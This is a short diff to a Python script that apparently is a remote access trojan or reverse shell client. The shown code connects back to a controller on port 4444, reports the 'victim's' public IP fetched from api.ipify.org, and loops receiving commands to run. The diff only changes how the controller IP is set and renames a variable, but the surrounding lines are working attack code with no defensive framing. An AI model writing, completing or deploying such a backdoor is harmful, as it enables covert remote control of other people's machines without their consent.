@@ -7,15 +7,15 @@ import platform
 from datetime import datetime
 
 
-IP = ""
+IP = (socket.gethostbyname_ex(socket.gethostname())[2][1])
 PORT = 4444
 
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
-    ip = get('https://api.ipify.org').text
-    s.send('[+] Victims public IP: {}'.format(ip).encode())
+    victim_ip = get('https://api.ipify.org').text
+    s.send('[+] Victims public IP: {}'.format(victim_ip).encode())
     while True:
         command = s.recv(1024).decode()
         if command != "":
